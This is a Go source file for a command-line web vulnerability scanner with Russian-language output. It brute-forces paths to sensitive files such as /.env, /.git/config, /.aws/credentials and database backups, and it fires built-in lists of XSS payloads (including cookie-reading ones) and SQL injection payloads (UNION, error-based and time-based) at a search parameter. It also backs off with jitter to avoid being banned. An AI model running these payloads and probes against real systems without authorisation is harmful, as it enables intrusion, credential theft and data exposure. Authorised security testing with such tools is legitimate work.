package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

const (
	defaultWorkers    = 10
	requestTimeout    = 3 * time.Second
	searchParam       = "search"
	maxScanBuf        = 1024 * 1024
	maxBodyBytes      = 2 * 1024 * 1024
	probeTokenLen     = 12
	defaultConfigFile = "config.json"

	jitterMin = 500
	jitterMax = 1500
)

const banner = `
	 ██████╗  ██████╗ ███████╗███████╗ ██████╗
	██╔════╝ ██╔═══██╗██╔════╝██╔════╝██╔════╝
	██║  ███╗██║   ██║███████╗█████╗  ██║
	██║   ██║██║   ██║╚════██║██╔══╝  ██║
	╚██████╔╝╚██████╔╝███████║███████╗╚██████╗
	 ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝
	        S c a n   ·   web vulnerability scanner   ·   v1.0
	  режимы: dir (пути) | xss (reflected) | sqli (error-based)
	           github.com/Wakanda1519
`

type Config struct {
	DirEndpoints []string `json:"dir_endpoints"`
	XSSPayloads  []string `json:"xss_payloads"`
	SQLIPayloads []string `json:"sqli_payloads"`
	SQLIErrors   []string `json:"sqli_errors"`
}

var commentRe = regexp.MustCompile(`(?s)<!--(.*?)-->`)

var clueKeywords = []string{"todo", "api", "admin", "test", "v1", "debug"}

type Job struct {
	URL     string
	Payload string
}

type Scanner struct {
	client  *http.Client
	workers int
	mode    string
	mu      sync.Mutex

	dirEndpoints []string
	xssPayloads  []string
	sqliPayloads []string
	sqliErrors   []string

	badContentLength int64
}

func main() {
	target := flag.String("u", "", "Целевой URL (например, http://localhost:8080)")
	wordlist := flag.String("w", "", "Путь к файлу-словарю (дополнительно к config.json)")
	threads := flag.Int("t", defaultWorkers, "Количество потоков/воркеров")
	mode := flag.String("m", "dir", "Режим работы: dir | xss | sqli")
	configPath := flag.String("c", defaultConfigFile, "Путь к файлу конфигурации config.json")
	flag.Parse()

	printBanner()

	if *target == "" {
		fmt.Println("[-] Ошибка: не указан целевой URL. Используйте флаг -u.")
		flag.Usage()
		os.Exit(1)
	}

	if *threads < 1 {
		*threads = 1
	}

	cfg := ensureConfig(*configPath)

	scanner := &Scanner{
		client: &http.Client{
			Timeout: requestTimeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		workers:          *threads,
		mode:             strings.ToLower(strings.TrimSpace(*mode)),
		dirEndpoints:     cfg.DirEndpoints,
		xssPayloads:      cfg.XSSPayloads,
		sqliPayloads:     cfg.SQLIPayloads,
		sqliErrors:       cfg.SQLIErrors,
		badContentLength: -1,
	}

	base := strings.TrimRight(*target, "/")

	var jobs <-chan Job
	var err error
	switch scanner.mode {
	case "dir":
		if *wordlist == "" && len(scanner.dirEndpoints) == 0 {
			fmt.Println("[-] Ошибка: режим 'dir' требует словарь (-w) или непустой dir_endpoints.")
			os.Exit(1)
		}
		scanner.calibrate404(base)
		jobs, err = scanner.dirJobs(base, *wordlist)
		if err != nil {
			fmt.Printf("[-] Ошибка: %v\n", err)
			os.Exit(1)
		}
	case "xss":
		if len(scanner.xssPayloads) == 0 {
			fmt.Println("[-] Ошибка: пустой xss_payloads в конфиге.")
			os.Exit(1)
		}
		jobs = scanner.payloadJobs(base, scanner.xssPayloads)
	case "sqli":
		if len(scanner.sqliPayloads) == 0 {
			fmt.Println("[-] Ошибка: пустой sqli_payloads в конфиге.")
			os.Exit(1)
		}
		if len(scanner.sqliErrors) == 0 {
			fmt.Println("[-] Предупреждение: sqli_errors пуст — срабатывания невозможны.")
		}
		jobs = scanner.payloadJobs(base, scanner.sqliPayloads)
	default:
		fmt.Printf("[-] Ошибка: неизвестный режим %q (доступно: dir, xss, sqli).\n", scanner.mode)
		os.Exit(1)
	}

	fmt.Printf("[*] Запуск сканирования: %s (режим=%s, воркеров=%d, таймаут=%s)\n",
		base, scanner.mode, scanner.workers, requestTimeout)

	scanner.run(jobs)

	fmt.Println("[*] Сканирование завершено.")
}

func printBanner() {
	fmt.Print(banner)
	fmt.Println()
}

func ensureConfig(path string) *Config {
	if _, err := os.Stat(path); err == nil {
		cfg, err := loadConfig(path)
		if err != nil {
			fmt.Printf("[-] Файл %s найден, но не читается (%v) — использую встроенную базу.\n", path, err)
			return defaultConfig()
		}
		fmt.Printf("[*] Конфигурация загружена: %s (эндпоинтов=%d, xss=%d, sqli=%d, сигнатур=%d)\n",
			path, len(cfg.DirEndpoints), len(cfg.XSSPayloads), len(cfg.SQLIPayloads), len(cfg.SQLIErrors))
		return cfg
	} else if !os.IsNotExist(err) {
		fmt.Printf("[-] Не удалось проверить %s (%v) — использую встроенную базу.\n", path, err)
		return defaultConfig()
	}

	cfg := defaultConfig()
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		fmt.Printf("[-] Не удалось сериализовать базу (%v) — использую её в памяти.\n", err)
		return cfg
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		fmt.Printf("[-] Не удалось создать %q (%v) — использую базу в памяти.\n", path, err)
		return cfg
	}

	fmt.Printf("[+] Файл %s не найден — создана база по умолчанию (эндпоинтов=%d, xss=%d, sqli=%d, сигнатур=%d)\n",
		path, len(cfg.DirEndpoints), len(cfg.XSSPayloads), len(cfg.SQLIPayloads), len(cfg.SQLIErrors))
	return cfg
}

func loadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("некорректный JSON: %w", err)
	}
	return &cfg, nil
}

func defaultConfig() *Config {
	return &Config{
		DirEndpoints: defaultDirEndpoints(),
		XSSPayloads:  defaultXSSPayloads(),
		SQLIPayloads: defaultSQLIPayloads(),
		SQLIErrors:   defaultSQLIErrors(),
	}
}

func defaultDirEndpoints() []string {
	return []string{
		"/admin", "/admin/", "/admin/login", "/adminpanel", "/admin-panel",
		"/administrator/", "/administrator/index.php", "/wp-admin/", "/wp-login.php",
		"/wp-json/wp/v2/users", "/xmlrpc.php", "/wp-config.php", "/wp-config.php.bak",
		"/bitrix/admin/", "/user/login", "/phpmyadmin/", "/pma/", "/adminer.php",
		"/manager/html", "/console", "/dashboard/", "/login", "/cpanel", "/webadmin",
		"/api", "/api/", "/api/v1", "/api/v2", "/api/v1/auth", "/api/v1/login",
		"/api/v1/users", "/api/v1/admin", "/api/v1/config", "/api/auth/login",
		"/graphql", "/graphiql", "/swagger-ui.html", "/swagger.json", "/openapi.json",
		"/v2/api-docs", "/actuator", "/actuator/health", "/actuator/env", "/debug",
		"/debug/vars", "/h2-console", "/test.php", "/phpinfo.php", "/server-status",
		"/.env", "/.env.bak", "/.git/config", "/.git/HEAD", "/.gitignore",
		"/.svn/entries", "/.htaccess", "/.htpasswd", "/web.config", "/config.php",
		"/config.json", "/config.yml", "/settings.py", "/docker-compose.yml",
		"/Dockerfile", "/composer.json", "/package.json", "/.aws/credentials",
		"/backup.zip", "/backup.rar", "/backup.tar.gz", "/backup.sql", "/backup.db",
		"/dump.sql", "/database.sql", "/db.sqlite3", "/error.log", "/access.log",
		"/debug.log", "/laravel.log", "/logs/",
		"/robots.txt", "/sitemap.xml", "/sitemap_index.xml", "/crossdomain.xml",
		"/security.txt", "/.well-known/security.txt", "/metrics", "/favicon.ico",
	}
}

func defaultXSSPayloads() []string {
	return []string{
		`<script>alert(1)</script>`,
		`<script>alert(document.domain)</script>`,
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<script>alert(String.fromCharCode(88,83,83))</script>`,
		`<img src=x onerror=alert(1)>`,
		`<img src=x onerror=prompt(1)>`,
		`<img src=x onerror=alert(document.cookie)>`,
		`<IMG SRC=x ONERROR=alert(1)>`,
		`<img src=x onerror=eval('ale'+'rt(1)')>`,
		`<svg onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg><script>alert(1)</script></svg>`,
		`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
		`<body onload=alert(1)>`,
		`<iframe src=javascript:alert(1)>`,
		`<iframe srcdoc="<script>alert(1)</script>">`,
		`<details open ontoggle=alert(1)>`,
		`<input autofocus onfocus=alert(1)>`,
		`<marquee onstart=alert(1)>`,
		`<button formaction=javascript:alert(1)>X</button>`,
		`<div onanimationstart=alert(1) style="animation-name:x">`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`</script><script>alert(1)</script>`,
		`';alert(1)//`,
		`"+alert(1)+"`,
		`javascript:alert(1)`,
		`JaVaScRiPt:alert(1)`,
		`<a href="javascript:alert(1)">click</a>`,
		`\u003cscript\u003ealert(1)\u003c/script\u003e`,
	}
}

func defaultSQLIPayloads() []string {
	return []string{
		`' OR 1=1-- -`,
		`' OR 1=1#`,
		`' OR '1'='1`,
		`" OR "1"="1`,
		`admin' --`,
		`admin'#`,
		`') OR ('1'='1`,
		`' or 1=1 limit 1 -- -`,
		`' UNION SELECT NULL-- -`,
		`' UNION SELECT NULL,NULL-- -`,
		`' UNION SELECT 1,version()-- -`,
		`' UNION ALL SELECT NULL,@@version-- -`,
		`' UNION SELECT sqlite_version()-- -`,
		`' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -`,
		`' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -`,
		`' AND 1=CAST((SELECT version()) AS int)-- -`,
		`' AND 1=CONVERT(int,(SELECT @@version))-- -`,
		`' AND 1=CAST(@@version AS int)-- -`,
		`' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS int)-- -`,
		`' AND 1=1-- -`,
		`' AND 1=2-- -`,
		`' AND 'a'='a`,
		`' AND 'a'='b`,
		`' AND LENGTH('abc')=3-- -`,
		`' AND SLEEP(5)-- -`,
		`' AND SLEEP(5)#`,
		`' AND BENCHMARK(10000000,MD5(1))-- -`,
		`'; SELECT pg_sleep(5)-- -`,
		`' AND pg_sleep(5)-- -`,
		`'; WAITFOR DELAY '0:0:5'-- -`,
		`1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -`,
		`'`, `''`, `"`, `--`, `#`, `/*`, `*/`, `' -- -`, `') --`, `") --`,
	}
}

func defaultSQLIErrors() []string {
	return []string{
		"SQL syntax",
		"You have an error in your SQL syntax",
		"check the manual that corresponds to your MySQL server version",
		"mysql_fetch",
		"Warning: mysql",
		"MySqlException",
		"PostgreSQL query failed",
		"Warning: pg_",
		"pg_query",
		"ERROR: syntax error at or near",
		"PSQLException",
		"SQLite3::Query",
		"sqlite3.OperationalError",
		"SQLite.Exception",
		"unrecognized token",
		"ODBC SQL Server Driver",
		"Microsoft OLE DB Provider for SQL Server",
		"Unclosed quotation mark after the character string",
		"Incorrect syntax near",
		"System.Data.SqlClient.SqlException",
		"ODBC Microsoft Access",
		"Microsoft JET Database Engine",
		"ORA-",
		"ORA-01756",
		"quoted string not properly terminated",
		"SQLSTATE[",
		"PDOException",
		"java.sql.SQLException",
		"driver failure",
		"ODBC Driver",
	}
}

func (s *Scanner) run(jobs <-chan Job) {
	var wg sync.WaitGroup

	for i := 0; i < s.workers; i++ {
		wg.Add(1)
		go s.worker(jobs, &wg)
	}

	wg.Wait()
}

func (s *Scanner) worker(jobs <-chan Job, wg *sync.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		switch s.mode {
		case "xss":
			s.checkXSS(job)
		case "sqli":
			s.checkSQLI(job)
		default:
			s.checkDir(job)
		}
	}
}

func (s *Scanner) calibrate404(base string) {
	probe := base + "/random_" + randomToken(probeTokenLen)

	status, body, err := s.fetch(probe)
	if err != nil {
		s.badContentLength = -1
		s.printf("[-] Smart 404: проверочный запрос не удался (%v) — фильтрация отключена\n", err)
		return
	}

	if status != http.StatusOK {
		s.badContentLength = -1
		s.printf("[*] Smart 404: baseline Status %d (не кастомная 404) — фильтр отключён\n", status)
		return
	}

	s.badContentLength = int64(len(body))
	s.printf("[*] Smart 404: baseline %s -> Status %d, длина тела = %d байт\n",
		probe, status, len(body))
}

func (s *Scanner) checkDir(job Job) {
	status, body, err := s.fetch(job.URL)
	if err != nil {
		return
	}

	if s.shouldThrottle(status) {
		s.backoff(status, job.URL)
		return
	}

	switch status {
	case http.StatusOK:
		if s.isFalsePositive(body) {
			return
		}
		s.printf("[+] Найдено: %s (Status: %d)\n", job.URL, status)
		s.spiderComments(job.URL, body)
	case http.StatusMovedPermanently, http.StatusFound:
		s.printf("[+] Найдено: %s (Status: %d)\n", job.URL, status)
	}
}

func (s *Scanner) checkXSS(job Job) {
	status, body, err := s.fetch(job.URL)
	if err != nil {
		return
	}

	if s.shouldThrottle(status) {
		s.backoff(status, job.URL)
		return
	}

	bodyStr := string(body)
	encoded := url.QueryEscape(job.Payload)
	if strings.Contains(bodyStr, job.Payload) || strings.Contains(bodyStr, encoded) {
		s.printf("[!!!] Потенциальная XSS: %s\n", job.Payload)
	}
}

func (s *Scanner) checkSQLI(job Job) {
	status, body, err := s.fetch(job.URL)
	if err != nil {
		return
	}

	if s.shouldThrottle(status) {
		s.backoff(status, job.URL)
		return
	}

	bodyStr := strings.ToLower(string(body))
	for _, sig := range s.sqliErrors {
		if sig == "" {
			continue
		}
		if strings.Contains(bodyStr, strings.ToLower(sig)) {
			s.printf("[!!!] Возможная SQLi!\n")
			s.printf("      URL:       %s\n", job.URL)
			s.printf("      Пейлоад:   %s\n", job.Payload)
			s.printf("      Сигнатура: %s\n", sig)
			return
		}
	}
}

func (s *Scanner) spiderComments(urlStr string, body []byte) {
	for _, match := range commentRe.FindAllSubmatch(body, -1) {
		comment := sanitizeComment(string(match[1]))
		if comment == "" || !hasClue(comment) {
			continue
		}
		s.printf("[!] Найдена зацепка в комментарии: %s\n", comment)
	}
}

func sanitizeComment(text string) string {
	const maxCommentLen = 200

	clean := strings.Map(func(r rune) rune {
		switch {
		case r == '\n' || r == '\r' || r == '\t':
			return ' '
		case r < 0x20 || r == 0x7f:
			return -1
		default:
			return r
		}
	}, text)

	clean = strings.TrimSpace(clean)
	if len(clean) > maxCommentLen {
		clean = clean[:maxCommentLen] + "..."
	}
	return clean
}

func (s *Scanner) isFalsePositive(body []byte) bool {
	return s.badContentLength >= 0 && int64(len(body)) == s.badContentLength
}

func (s *Scanner) shouldThrottle(status int) bool {
	switch status {
	case http.StatusTooManyRequests,
		http.StatusBadGateway,
		http.StatusServiceUnavailable,
		http.StatusGatewayTimeout:
		return true
	}
	return false
}

func (s *Scanner) backoff(status int, urlStr string) {
	delay := time.Duration(jitterMin+rand.Intn(jitterMax-jitterMin+1)) * time.Millisecond
	s.printf("[~] Код %d на %s — пауза %d мс (anti-ban)\n", status, urlStr, delay.Milliseconds())
	time.Sleep(delay)
}

func (s *Scanner) fetch(urlStr string) (int, []byte, error) {
	resp, err := s.client.Get(urlStr)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
	if err != nil {
		return resp.StatusCode, body, err
	}

	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, body, nil
}

func hasClue(text string) bool {
	lower := strings.ToLower(text)
	for _, kw := range clueKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

func (s *Scanner) dirJobs(base, wordlist string) (<-chan Job, error) {
	var file *os.File
	if wordlist != "" {
		f, err := os.Open(wordlist)
		if err != nil {
			return nil, fmt.Errorf("не удалось открыть словарь %s: %w", wordlist, err)
		}
		file = f
	}

	jobs := make(chan Job, s.workers*2)

	go func() {
		defer close(jobs)

		seen := make(map[string]struct{}, len(s.dirEndpoints))
		emit := func(raw string) {
			word := strings.TrimSpace(raw)
			if word == "" || strings.HasPrefix(word, "#") {
				return
			}
			full := base + "/" + strings.TrimLeft(word, "/")
			if _, dup := seen[full]; dup {
				return
			}
			seen[full] = struct{}{}
			jobs <- Job{URL: full}
		}

		for _, ep := range s.dirEndpoints {
			emit(ep)
		}

		if file == nil {
			return
		}
		defer file.Close()

		sc := bufio.NewScanner(file)
		sc.Buffer(make([]byte, 0, 64*1024), maxScanBuf)
		for sc.Scan() {
			emit(sc.Text())
		}
		if err := sc.Err(); err != nil {
			s.printf("[-] Ошибка чтения словаря: %v\n", err)
		}
	}()

	return jobs, nil
}

func (s *Scanner) payloadJobs(base string, payloads []string) <-chan Job {
	jobs := make(chan Job, len(payloads))

	go func() {
		defer close(jobs)
		for _, payload := range payloads {
			jobs <- Job{
				URL:     fmt.Sprintf("%s?%s=%s", base, searchParam, url.QueryEscape(payload)),
				Payload: payload,
			}
		}
	}()

	return jobs
}

func randomToken(n int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = alphabet[rand.Intn(len(alphabet))]
	}
	return string(b)
}

func (s *Scanner) printf(format string, args ...any) {
	s.mu.Lock()
	defer s.mu.Unlock()
	fmt.Printf(format, args...)
}
